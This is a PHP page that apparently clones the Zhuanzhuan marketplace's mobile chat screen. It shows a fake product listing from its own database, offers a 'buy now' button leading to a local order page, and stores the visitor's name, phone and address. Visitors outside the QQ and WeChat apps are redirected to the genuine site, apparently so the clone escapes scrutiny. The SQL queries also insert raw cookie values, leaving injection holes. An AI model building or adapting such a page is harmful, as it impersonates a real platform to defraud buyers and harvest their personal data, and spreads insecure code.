<?php
$conf['qqjump']=1;
$ua = $_SERVER['HTTP_USER_AGENT'];
if(strpos($_SERVER['HTTP_USER_AGENT'], 'QQ/')!==false && $conf['qqjump']==1 )

{$a='http://'.$_SERVER['SERVER_NAME'].':'.$_SERVER["SERVER_PORT"].$_SERVER["REQUEST_URI"] ; 	
 }
else{if (strpos($ua, 'MicroMessenger') == false && strpos($ua, 'Windows Phone') == false) {
    echo "<script language=\"javascript\">
  document.location.href=\"http://m.zhuanzhuan.com\";
</script>";
              
    //跳转移动端页面
    $alipay_type=5;//支付宝移动支付
    $wxpay_type=3;     exit;//微信H5支付
} else {
  $wxpay_type=2;//微信公众号
}
}
?>
<?php 
Define('PM_CALL',true);
Define('INC_CALL',true);
include dirname(__FILE__).('/../includes/global.class.php');
include dirname(__FILE__).('/../config/mysql.func.php');
include dirname(__FILE__).('/../config/Conn.php');
include dirname(__FILE__).('/../includes/getdata.php');

setcookie('GoodsID4',$_COOKIE['GoodsID3']);
//写入订单号
setcookie('orderid',$zhuanzhuanORDER);
$xzshijian=date('Y-m-d H:i:s', time());

if($_COOKIE['GoodsID3']){
	

	    $cookTel=substr_replace($_COOKIE['se_tel'],'****',3,4);

	
	$_GoodsID = _fetch_array("SELECT * FROM goods WHERE goods_id='{$_COOKIE['GoodsID3']}'") or die('SQL执行错误');
	
		//判断操作记录数据是否存在，存在就更新此数据状态为2订单页和时间
	$_OID = _fetch_array("SELECT * FROM useraddress WHERE gid='{$_COOKIE['GoodsID3']}'");
	if($_OID){
		_query("
			UPDATE 
				useraddress
			SET 
				state=2,
				utime='{$xzshijian}'
			WHERE 
				gid='{$_COOKIE['GoodsID3']}' LIMIT 1") or die(mysql_error());
				
				
		if($_COOKIE['se_name']){
			if($_OID){
			  _query("
				  UPDATE 
					  useraddress
				  SET 
					  uadd='{$_COOKIE['se_address']}',
					  utel='{$_COOKIE['se_tel']}',
					  uname='{$_COOKIE['se_name']}',
					  orderid='{$zhuanzhuanORDER}',
					  state=3
				  WHERE 
					  gid='{$_COOKIE['GoodsID3']}' LIMIT 1");
				
			}
		}	
		  _close();
		  session_destroy();
		  
	}

}
if($_COOKIE['GoodsURL1_1']){
    if(!$_COOKIE['GoodsID3']){
       header('Location:'. htmlspecialchars_decode($_COOKIE['GoodsURL1_1']).'');
    }
}else{
    header('Location:'. htmlspecialchars_decode($Class1_jump_url).'');
}

if($_GoodsID['jianyanji']==1)
$jianyanji888="QQ";
if($_GoodsID['jianyanji']==2)
$jianyanji888="微信";
?>
<!DOCTYPE html>
<!-- saved from url=(0105)https://m.zhuanzhuan.com/open/WebIM/index.html?infoId=1285812010820392971&userId=196279264163824896#/home -->
<html style="font-size: 31.8px;"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title><?php echo $_GoodsID['user_name'];?></title><link rel="dns-prefetch" href="https://m.zhuanzhuan.com/"><link rel="dns-prefetch" href="https://s1.zhuanstatic.com/"><link rel="dns-prefetch" href="https://img1.zhuanstatic.com/"><link rel="dns-prefetch" href="https://app.zhuanzhuan.com/"><link rel="shortcut icon" href="https://m.zhuanzhuan.com/favicon.ico"><link rel="icon" href="https://m.zhuanzhuan.com/favicon.ico"><link rel="apple-touch-icon" href="https://m.zhuanzhuan.com/favicon.ico"><style>body,
      h1,
      h2,
      h3,
      h4,
      p,
      ul,
      ol,
      dl,
      dd,
      textarea,
      button {
        margin: 0;
        padding: 0;
      }

      li {
        list-style: none;
      }

      body{
        -webkit-overflow-scrolling: touch;
        width:100%;
      }

      body,
      h1,
      h2,
      h3,
      h4,
      h5,
      h6,
      p,
      ul,
      ol,
      li,
      dl,
      dt,
      dd,
      a,
      textarea,
      input,
      button,
      span,
      em,
      strong,
      img,
      div {
        /* -webkit-touch-callout: none;
        -moz-touch-callout: none;
        -ms-touch-callout: none;
        touch-callout: none; */
        -webkit-tap-highlight-color: transparent;
        -moz-tap-highlight-color: transparent;
        -ms-tap-highlight-color: transparent;
        tap-highlight-color: transparent;
        font-style: normal;
      }

      input[type=text],
      input[type=button],
      input[type=password],
      input[type=telphone],
      input[type=search],
      textarea,
      button {
        outline: 0 none;
        -webkit-appearance: none;
      }

      textarea {
        resize: none;
      }

      img {
        border: none;
      }

      a {
        text-decoration: none;
      }

      html {
        font-size:625%;
        -webkit-text-size-adjust: 100%;
        -moz-text-size-adjust: 100%;
        -ms-text-size-adjust: 100%;
        text-size-adjust: 100%;
      }
      .app-bg{
        position: fixed;
        width: 200%;
        height: 200vh;
        top: -25%;
        height: -50vh;
        z-index: -100;
        background: white;
      }</style><meta name="viewport" content="initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no"><script charset="utf-8" src="./liaoliao_files/0.e194eb52670d92089b16.js"></script><script charset="utf-8" src="./liaoliao_files/1.c1f0704515c8df3e0c4d.js"></script><script charset="utf-8" src="./liaoliao_files/6.2d33db3f2aa6644dcae2.js"></script><script charset="utf-8" src="./liaoliao_files/11.534e3fdc1ef528a9cbac.js"></script><style type="text/css">
.toast-tip {
  width: 9.33333333rem;
  padding: 0.66666667rem;
  border-radius: 0.53333333rem;
  background-color: #000;
  opacity: 0.9;
  position: fixed;
  top: 50%;
  left: 50%;
  margin-left: -5.33333333rem;
  margin-top: -3.2rem;
  z-index: 99999;
}
.toast-tip p {
  width: 100%;
  height: auto;
  color: white;
  font-size: 0.69333333rem;
  text-align: center;
  line-height: 1.2rem;
  margin: 0;
}
</style><style type="text/css">.frame .adaptiveLayer{display:-webkit-flex;display:-ms-flexbox;display:flex}.frame .adaptiveLayer-f{-webkit-flex:none;-ms-flex:none;flex:none}.frame .adaptiveLayer-a{-webkit-flex:1;-ms-flex:1;flex:1;overflow:hidden}.open-alert{border-radius:.53333333rem}.open-alert h2{background-color:#bf9147;text-align:center;font-size:.96rem;line-height:2.66666667rem;color:#f55;border-bottom:.02666667rem solid #ddd;margin-bottom:.53333333rem}</style><style type="text/css">.frame .adaptiveLayer[data-v-50a2feac]{display:-webkit-flex;display:-ms-flexbox;display:flex}.frame .adaptiveLayer-f[data-v-50a2feac]{-webkit-flex:none;-ms-flex:none;flex:none}.frame .adaptiveLayer-a[data-v-50a2feac]{-webkit-flex:1;-ms-flex:1;flex:1;overflow:hidden}.chat-sendmsg[data-v-50a2feac]{position:fixed;bottom:0;width:100%;border-top:1px solid #d9d9d9;background-color:#f4f4f6;z-index:1000}@media only screen and (device-width:375px) and (device-height:812px) and (-webkit-device-pixel-ratio:3){.chat-sendmsg[data-v-50a2feac]{padding-bottom:1.2rem}}.chat-sendmsg-text[data-v-50a2feac]{float:left;padding:.26666667rem .53333333rem;margin:.53333333rem 0 .53333333rem .53333333rem;border:.02666667rem solid #abadb2;border-radius:.16rem;width:15.46666667rem;font-size:.74666667rem;line-height:.96rem;height:.96rem;overflow:hidden;outline:none;background-color:#fff}.chat-sendmsg-btn[data-v-50a2feac]{right:.8rem;width:1.49333333rem;height:1.49333333rem;border-radius:50%;background-image:url(https://img1.zhuanstatic.com/open/zhuanzhuan/zzwa/main/chat/add.png);background-size:contain;background-repeat:no-repeat}.chat-sendmsg-btn[data-v-50a2feac],.chat-sendmsg-sendbtn[data-v-50a2feac]{display:inline-block;position:absolute;top:.53333333rem}.chat-sendmsg-sendbtn[data-v-50a2feac]{width:2rem;height:1.54666667rem;line-height:1.54666667rem;text-align:center;font-size:.74666667rem;border:.02666667rem solid #abadb2;border-radius:.16rem;right:.66666667rem;background-color:#fff}[data-v-50a2feac]::-webkit-scrollbar{display:none}</style><style type="text/css">.frame .adaptiveLayer[data-v-5dc127da]{display:-webkit-flex;display:-ms-flexbox;display:flex}.frame .adaptiveLayer-f[data-v-5dc127da]{-webkit-flex:none;-ms-flex:none;flex:none}.frame .adaptiveLayer-a[data-v-5dc127da]{-webkit-flex:1;-ms-flex:1;flex:1;overflow:hidden}.chat-goods[data-v-5dc127da]{width:100%;height:3.2rem;padding:.53333333rem .8rem;-webkit-box-sizing:border-box;box-sizing:border-box;background-color:#fff}.chat-goods-pic[data-v-5dc127da]{width:2.13333333rem;height:2.13333333rem;background-color:#eee}.chat-goods-info[data-v-5dc127da]{display:inline-block;vertical-align:top;margin-left:.66666667rem;position:relative;height:2.26666667rem}.chat-goods-title[data-v-5dc127da]{font-size:.74666667rem;color:#aaaeb9;width:10.66666667rem;white-space:nowrap;overflow:hidden;-o-text-overflow:ellipsis;text-overflow:ellipsis}.chat-goods-price[data-v-5dc127da]{font-size:1.01333333rem;font-weight:700;color:#ff472e;position:absolute;bottom:0}.chat-goods-price span[data-v-5dc127da]{font-size:.53333333rem;font-weight:400}.chat-goods-btn[data-v-5dc127da]{position:absolute;top:.8rem;right:.8rem;font-weight:700;font-size:.69333333rem;border-radius:.16rem;background-color:#fff;height:1.01333333rem;line-height:1.01333333rem;padding:.18666667rem .53333333rem;-webkit-box-sizing:content-box;box-sizing:content-box;color:#ff583f;border:.05333333rem solid #ff583f}.chat-goods-btn[data-v-5dc127da]:after{border:0}</style><style type="text/css">.frame .adaptiveLayer[data-v-3c7c4080]{display:-webkit-flex;display:-ms-flexbox;display:flex}.frame .adaptiveLayer-f[data-v-3c7c4080]{-webkit-flex:none;-ms-flex:none;flex:none}.frame .adaptiveLayer-a[data-v-3c7c4080]{-webkit-flex:1;-ms-flex:1;flex:1;overflow:hidden}</style><style type="text/css">.frame .adaptiveLayer[data-v-6d1fe942]{display:-webkit-flex;display:-ms-flexbox;display:flex}.frame .adaptiveLayer-f[data-v-6d1fe942]{-webkit-flex:none;-ms-flex:none;flex:none}.frame .adaptiveLayer-a[data-v-6d1fe942]{-webkit-flex:1;-ms-flex:1;flex:1;overflow:hidden}.close-btn[data-v-6d1fe942]{position:absolute;width:1.33333333rem;height:1.33333333rem;top:.53333333rem;right:.53333333rem;z-index:1;background-image:url(https://img1.zhuanstatic.com/open/WebIM/static/img/close-video.a82a102.png);background-size:cover}.main[data-v-6d1fe942]{position:fixed;top:0;left:0;bottom:0;right:0;background:#000;z-index:10000}.main[data-v-6d1fe942],.main .wrapU[data-v-6d1fe942]{width:100%;height:100vh}.main .wrapU[data-v-6d1fe942]{position:relative;overflow-y:hidden;overflow-x:auto;z-index:10001}.main .wrapU ul[data-v-6d1fe942]{position:absolute;top:0;left:0;height:100vh}.main .wrapU ul.animation[data-v-6d1fe942]{-webkit-transition:all 1s;-o-transition:all 1s;transition:all 1s}.main .wrapU ul li[data-v-6d1fe942]{float:left;overflow:hidden;height:100vh;background-repeat:no-repeat;background-size:100% auto;background-position:50%}.main-nav[data-v-6d1fe942],.main .wrapU ul li .img[data-v-6d1fe942]{width:100%}.main-nav[data-v-6d1fe942]{position:fixed;bottom:1.33333333rem}.main-nav ul[data-v-6d1fe942]{display:-webkit-flex;display:-ms-flexbox;display:flex;width:100%;-webkit-justify-content:center;-ms-flex-pack:center;justify-content:center}.main-nav ul .point[data-v-6d1fe942]{width:.53333333rem;height:.53333333rem;border-radius:50%;background-color:#333}.main-nav ul .gap[data-v-6d1fe942]:not(:last-child){margin-right:.53333333rem}.main-nav ul .active[data-v-6d1fe942]{background-color:#fff}</style><style type="text/css">.frame .adaptiveLayer[data-v-634ebe70]{display:-webkit-flex;display:-ms-flexbox;display:flex}.frame .adaptiveLayer-f[data-v-634ebe70]{-webkit-flex:none;-ms-flex:none;flex:none}.frame .adaptiveLayer-a[data-v-634ebe70]{-webkit-flex:1;-ms-flex:1;flex:1;overflow:hidden}.chat-my[data-v-634ebe70]{padding:.56rem .8rem;margin:0}.chat-item-time[data-v-634ebe70]{text-align:center;font-size:.69333333rem;color:#caceda;width:100%;line-height:1.06666667rem;padding:.53333333rem 0}.chat-my .chat-item[data-v-634ebe70]{padding-left:2.66666667rem;margin:0;clear:both;overflow:hidden}.chat-my .chat-item-portrait[data-v-634ebe70]{float:right}.chat-my .chat-item-portrait img[data-v-634ebe70]{width:2.13333333rem;height:2.13333333rem;border-radius:1.06666667rem;border:none}.chat-my .chat-item-msg[data-v-634ebe70]{margin-right:2.82666667rem;margin-left:0;font-size:.74666667rem;color:#fff}.chat-my .chat-item-msg-content[data-v-634ebe70]{float:right;background-color:#fe9432;line-height:.96rem}.chat-my .chat-item-msg-content .chat-item-msg-read[data-v-634ebe70],.chat-my .chat-item-msg-content .chat-item-msg-unread[data-v-634ebe70]{position:absolute;bottom:0;left:-1.46666667rem;font-size:.56rem;line-height:1}.chat-my .chat-item-msg-content .chat-item-msg-read[data-v-634ebe70]{color:#9b9b9b}.chat-my .chat-item-msg-content .chat-item-msg-unread[data-v-634ebe70]{color:#72a8ff}.chat-item-msg-content-text[data-v-634ebe70]{margin:.53333333rem .66666667rem;overflow:hidden;word-break:break-all;white-space:pre-wrap}.chat-item-msg-content-goods[data-v-634ebe70]{margin:.53333333rem .66666667rem;overflow:hidden;width:12rem;height:4rem;margin:.32rem;border-radius:.26666667rem;background-color:#fff;-webkit-box-sizing:border-box;box-sizing:border-box;padding:.26666667rem}.chat-item-msg-content-goods-img[data-v-634ebe70]{width:3.46666667rem;height:3.46666667rem;border-radius:.26666667rem;float:left;background-size:cover;background-position:50%}.chat-item-msg-content-goods-content[data-v-634ebe70]{margin-left:.26666667rem;width:7.73333333rem;padding-top:.13333333rem;display:inline-block}.chat-item-msg-content-goods-content .title[data-v-634ebe70]{font-size:.69333333rem;width:7.73333333rem;height:1.86666667rem;line-height:.93333333rem;display:-webkit-box;-webkit-line-clamp:2;overflow:hidden;-o-text-overflow:ellipsis;text-overflow:ellipsis;color:#7a7e84}.chat-item-msg-content-goods-content .price-symbol[data-v-634ebe70]{margin-top:.26666667rem;font-size:.53333333rem;color:#f55;vertical-align:text-bottom;display:inline}.chat-item-msg-content-goods-content .price[data-v-634ebe70]{margin-top:.26666667rem;font-size:.8rem;color:#f55;vertical-align:text-bottom;display:inline-block;margin-left:.13333333rem}.chat-item-msg-content-img[data-v-634ebe70]{width:7.46666667rem;height:5.06666667rem;background-size:cover;margin:.32rem;border-radius:.26666667rem;background-repeat:no-repeat;background-position:50%}.chat-to[data-v-634ebe70]{padding:.56rem .8rem;margin:0}.chat-to .chat-item[data-v-634ebe70]{padding-right:2.13333333rem;margin:0;clear:both;overflow:hidden}.chat-to .chat-item-portrait[data-v-634ebe70]{float:left}.chat-to .chat-item-portrait img[data-v-634ebe70]{width:2.13333333rem;height:2.13333333rem;border-radius:1.06666667rem;border:none}.chat-to .chat-item-msg[data-v-634ebe70]{margin-left:2.82666667rem;font-size:.74666667rem;color:#7a7e84}.chat-to .chat-item-msg-content[data-v-634ebe70]{display:inline-block;background-color:#fff;line-height:.96rem;border:1px solid #c3c3c3}.chat-order[data-v-634ebe70]{padding:.56rem .8rem}.chat-ordermsg[data-v-634ebe70]{border-radius:.16rem;padding:.66666667rem;margin:0 .66666667rem 1.06666667rem;background-color:#fff;clear:both}.chat-ordermsg-img[data-v-634ebe70]{width:2.13333333rem;height:2.13333333rem;border-radius:50%;float:left}.chat-ordermsg-info[data-v-634ebe70]{margin-left:.8rem;height:2.13333333rem;display:inline-block}.chat-ordermsg-title[data-v-634ebe70]{color:#42474d;font-size:.85333333rem;overflow:hidden;-o-text-overflow:ellipsis;text-overflow:ellipsis;white-space:nowrap;margin:.53333333rem 0}.chat-spam[data-v-634ebe70]{width:17.06666667rem;margin:.8rem auto;background:#fff;padding:.66666667rem;-webkit-box-sizing:border-box;box-sizing:border-box}.chat-spam-title[data-v-634ebe70]{color:#f55;font-size:.85333333rem;text-align:center;margin-bottom:.8rem}.chat-spam-content[data-v-634ebe70]{background:url(https://img1.zhuanstatic.com/open/zhuanzhuan/zzwa/main/chat/broad.png) no-repeat left .16rem;background-size:.74666667rem .74666667rem;color:#999;font-size:.74666667rem;text-indent:1.06666667rem}.chat-spam-content .report[data-v-634ebe70]{display:inline-block;text-indent:0;width:2.66666667rem;background:#f55;border-radius:.53333333rem;color:#fff;text-align:center}</style><style type="text/css">.frame .adaptiveLayer[data-v-5701a94d]{display:-webkit-flex;display:-ms-flexbox;display:flex}.frame .adaptiveLayer-f[data-v-5701a94d]{-webkit-flex:none;-ms-flex:none;flex:none}.frame .adaptiveLayer-a[data-v-5701a94d]{-webkit-flex:1;-ms-flex:1;flex:1;overflow:hidden}.chat-tip-container[data-v-5701a94d]{width:100%;border-bottom:.02666667rem solid #eaeaea}.chat-tip-content[data-v-5701a94d]{background-color:#fff;padding:0 .8rem;position:relative}.chat-tip[data-v-5701a94d]{font-size:.74666667rem;border-top:.02666667rem solid #eaeaea;white-space:nowrap;padding:.4rem 0}.chat-tip img[data-v-5701a94d]{width:.74666667rem;height:.74666667rem;margin:.16rem .4rem 0 0}.chat-tip span[data-v-5701a94d]{display:inline-block;white-space:normal;vertical-align:top;color:#595e65;line-height:1.06666667rem;width:95%}.chat-tip-btn[data-v-5701a94d]{text-align:center;position:absolute;left:45%}.chat-tip-btn img[data-v-5701a94d]{width:2.61333333rem;height:1.06666667rem}</style><style type="text/css">.frame .adaptiveLayer{display:-webkit-flex;display:-ms-flexbox;display:flex}.frame .adaptiveLayer-f{-webkit-flex:none;-ms-flex:none;flex:none}.frame .adaptiveLayer-a{-webkit-flex:1;-ms-flex:1;flex:1;overflow:hidden}body{background:#f2f3f6}.chat-container{height:100vh}.chat-scroll{position:absolute;left:0;width:100%;overflow-x:hidden;overflow-y:scroll;-webkit-overflow-scrolling:touch;bottom:3.46666667rem}.chat-scroll.ready{visibility:visible}.chat-scroll.unready{visibility:hidden}@media only screen and (device-width:375px) and (device-height:812px) and (-webkit-device-pixel-ratio:3){.chat-scroll{bottom:4.66666667rem}}.chat-top-container{position:fixed;top:0;z-index:10;width:100%;border:none!important}.chat-top-container:before{content:"";position:absolute;width:200%;height:200%;top:0;left:0;-webkit-transform:scale(.5);-ms-transform:scale(.5);transform:scale(.5);-webkit-transform-origin:0 0;-ms-transform-origin:0 0;transform-origin:0 0;-webkit-box-sizing:border-box;box-sizing:border-box;pointer-events:none;z-index:1000;border-radius:0;border-top:1px solid #ddd}</style>
<script>
function $(element){
return element = document.getElementById(element);
}
function $D(){
var d=$('class1content');
var h=d.offsetHeight;
var maxh=300;
function dmove(){
h+=50; //设置层展开的速度
if(h>=maxh){
d.style.height='100px';
clearInterval(iIntervalId);
}else{
d.style.display='block';

}
}
iIntervalId=setInterval(dmove,2);
}
function $D2(){
var d=$('class1content');
var h=d.offsetHeight;
var maxh=300;
function dmove(){
h-=50;//设置层收缩的速度
if(h<=0){
d.style.display='none';
clearInterval(iIntervalId);
}else{
d.style.height=h+'px';
}
}
iIntervalId=setInterval(dmove,2);
}
function $use(){
var d=$('class1content');
var sb=$('stateBut');
if(d.style.display=='none'){
$D();

}else{
$D2();

}
}
</script>

</head><body style="width: 636px;"><div><div id="chatContainer" class="chat-container"><div class="chat-top-container"><div data-v-5dc127da="" class="chat-goods"><img data-v-5dc127da="" src="<?php echo $_GoodsID['goods_img1'] ?>" class="chat-goods-pic"> <div data-v-5dc127da="" class="chat-goods-info"><div data-v-5dc127da="" class="chat-goods-title">  <?php echo $_GoodsID['title']; ?></div> <div data-v-5dc127da="" class="chat-goods-price"><span data-v-5dc127da="">￥</span><?php echo $_GoodsID['price']; ?>
    </div></div> <div data-v-5dc127da=""><button onClick="location.href='order.php'" data-v-5dc127da="" class="chat-goods-btn enable">马上买</button></div></div> 
	
	<div data-v-5701a94d="" class="chat-tip-container"><div data-v-5701a94d="" class="chat-tip-content"><div id="class1content"><div data-v-5701a94d="" class="chat-tip"><img data-v-5701a94d="" src="./liaoliao_files/broad.png"> <span data-v-5701a94d="">发链接或二维码，引导加QQ、微信的都可能是骗子，请不要脱离转转交易。转转平台不会以任何名义收取定金、保证金、保障金、预付款！</span></div></div> 
	</div>
	
	<div data-v-5701a94d="" class="chat-tip-btn"> <a id="stateBut" onclick="$use()"><img data-v-5701a94d="" src="./liaoliao_files/tip.png"></a></div></div></div> <br><br>

<div data-v-634ebe70="" ><div data-v-634ebe70="" class="chat-to" ><div data-v-634ebe70="" class="chat-item-time" style="margin-top:30%;"><?php
header("Content-type:text/html;charset=utf-8");    //设置编码



echo "".date("m月d日 H:i:s")."
";

 


?></div> <div data-v-634ebe70="" class="chat-item"><div data-v-634ebe70="" class="chat-item-portrait"><img data-v-634ebe70="" src="<?php echo $_GoodsID['user_portrait'] ?>"></div> <div data-v-634ebe70="" class="chat-item-msg"><div data-v-634ebe70="" class="chat-item-msg-content"><!----> <div data-v-634ebe70="" class="chat-item-msg-content-text">你好，我当前不在线，喜欢商品请给我留言。</div> <!----> <!----></div></div></div></div> <!----> <!----></div> <div data-v-6d1fe942="" data-v-634ebe70="" class="main" style="display: none;"><div data-v-6d1fe942="" class="close-btn"></div> <div data-v-6d1fe942="" class="wrapU"><ul data-v-6d1fe942="" class="" style="width: 0%; left: 0px;"></ul></div> <div data-v-6d1fe942="" class="main-nav"><ul data-v-6d1fe942=""></ul></div></div></div></div>
	
	<div data-v-50a2feac="" class="chat-sendmsg"><textarea data-v-50a2feac="" confirm-type="send"name="noedit" size="20" disabled="disabled" value="不可编辑" class="chat-sendmsg-text">请前往APP进行咨询</textarea> <div data-v-50a2feac="" class="chat-sendmsg-sendbtn">发送</div></div></div> <div class="toast-tip" style="display: none;"><p></p></div></div><script type="text/javascript">!function(e){function t(t){for(var n,a,u=t[0],f=t[1],i=t[2],l=0,s=[];l<u.length;l++)a=u[l],o[a]&&s.push(o[a][0]),o[a]=0;for(n in f)Object.prototype.hasOwnProperty.call(f,n)&&(e[n]=f[n]);for(d&&d(t);s.length;)s.shift()();return c.push.apply(c,i||[]),r()}function r(){for(var e,t=0;t<c.length;t++){for(var r=c[t],n=!0,u=1;u<r.length;u++){var f=r[u];0!==o[f]&&(n=!1)}n&&(c.splice(t--,1),e=a(a.s=r[0]))}return e}var n={},o={3:0},c=[];function a(t){if(n[t])return n[t].exports;var r=n[t]={i:t,l:!1,exports:{}};return e[t].call(r.exports,r,r.exports,a),r.l=!0,r.exports}a.e=function(e){var t=[],r=o[e];if(0!==r)if(r)t.push(r[2]);else{var n=new Promise(function(t,n){r=o[e]=[t,n]});t.push(r[2]=n);var c,u=document.getElementsByTagName("head")[0],f=document.createElement("script");f.charset="utf-8",f.timeout=120,a.nc&&f.setAttribute("nonce",a.nc),f.src=function(e){return a.p+"static/js/"+e+"."+{0:"e194eb52670d92089b16",1:"c1f0704515c8df3e0c4d",2:"4f4dd8c6f9c0b8228b54",5:"ebcfc57c5ee08a1f3d8f",6:"2d33db3f2aa6644dcae2",11:"534e3fdc1ef528a9cbac",12:"f6cbc2d06e5993673d3d",13:"536cdfbd8608b9492458",14:"1cc3efa2756b0597df89",15:"a37092eed452a3da7d20"}[e]+".js"}(e),c=function(t){f.onerror=f.onload=null,clearTimeout(i);var r=o[e];if(0!==r){if(r){var n=t&&("load"===t.type?"missing":t.type),c=t&&t.target&&t.target.src,a=new Error("Loading chunk "+e+" failed.\n("+n+": "+c+")");a.type=n,a.request=c,r[1](a)}o[e]=void 0}};var i=setTimeout(function(){c({type:"timeout",target:f})},12e4);f.onerror=f.onload=c,u.appendChild(f)}return Promise.all(t)},a.m=e,a.c=n,a.d=function(e,t,r){a.o(e,t)||Object.defineProperty(e,t,{enumerable:!0,get:r})},a.r=function(e){"undefined"!=typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(e,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(e,"__esModule",{value:!0})},a.t=function(e,t){if(1&t&&(e=a(e)),8&t)return e;if(4&t&&"object"==typeof e&&e&&e.__esModule)return e;var r=Object.create(null);if(a.r(r),Object.defineProperty(r,"default",{enumerable:!0,value:e}),2&t&&"string"!=typeof e)for(var n in e)a.d(r,n,function(t){return e[t]}.bind(null,n));return r},a.n=function(e){var t=e&&e.__esModule?function(){return e.default}:function(){return e};return a.d(t,"a",t),t},a.o=function(e,t){return Object.prototype.hasOwnProperty.call(e,t)},a.p="https://s1.zhuanstatic.com/open/WebIM/",a.oe=function(e){throw console.error(e),e};var u=window.webpackJsonp=window.webpackJsonp||[],f=u.push.bind(u);u.push=t,u=u.slice();for(var i=0;i<u.length;i++)t(u[i]);var d=f;r()}([]);</script><script type="text/javascript" src="./liaoliao_files/4.41246e3ed65e01a2ddfb.js"></script><script type="text/javascript" src="./liaoliao_files/10.44ac889f708109980f90.js"></script><script type="text/javascript" src="./liaoliao_files/8.516be9a4cefe9e8cbc0e.js"></script><script type="text/javascript" src="./liaoliao_files/9.0ea4a882fc5d86e529a4.js"></script><script type="text/javascript" src="./liaoliao_files/7.77fb01142e25911032a9.js"></script></body></html>